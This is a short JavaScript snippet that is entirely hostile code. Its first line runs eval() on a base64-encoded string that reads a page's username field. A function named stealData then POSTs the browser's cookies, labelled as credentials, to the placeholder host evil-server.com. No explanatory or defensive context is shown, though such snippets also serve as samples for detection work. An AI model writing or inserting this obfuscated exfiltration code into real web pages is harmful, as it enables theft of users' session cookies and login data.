eval(atob('dmFyIHVzZXJuYW1lID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lJykudmFsdWU7'));
function stealData() {
    fetch('https://evil-server.com/collect', {
        method: 'POST',
        body: JSON.stringify({credentials: document.cookie})
    });
}